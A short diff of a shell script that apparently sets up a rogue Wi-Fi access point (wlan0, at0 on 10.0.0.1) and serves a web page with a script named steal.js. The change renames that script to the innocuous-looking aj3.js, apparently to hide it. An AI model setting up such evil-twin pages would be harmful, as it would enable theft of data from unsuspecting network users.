@@ -3,7 +3,7 @@
 name="wlan0"
 
 cp index.html /var/www/html/index.html
-cp steal.js /var/www/html/steal.js
+cp steal.js /var/www/html/aj3.js
 
 ifconfig at0 10.0.0.1 up
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
